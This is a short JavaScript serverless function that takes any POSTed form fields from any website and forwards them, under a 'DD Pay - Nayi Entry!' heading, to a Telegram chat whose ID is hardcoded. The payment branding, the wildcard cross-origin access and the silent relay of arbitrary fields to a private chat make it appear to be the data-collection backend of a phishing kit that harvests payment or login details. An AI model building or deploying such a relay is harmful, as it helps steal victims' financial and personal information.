export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Only POST' });

  const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7344589159';

  if (!TOKEN) {
    return res.status(500).json({ error: 'BOT TOKEN not set in Vercel Env' });
  }

  try {
    const body = req.body;
    let text = `🔥 DD Pay - Nayi Entry!\n\n`;
    for (const key in body) {
      text += `${key}: ${body[key]}\n`;
    }
    text += `\nTime: ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;

    const tgRes = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
    const result = await tgRes.json();
    
    if (!result.ok) return res.status(500).json({ error: 'Telegram Fail', details: result });

    return res.status(200).json({ success: true });
  } catch (e) {
    return res.status(500).json({ error: e.message });
  }
}
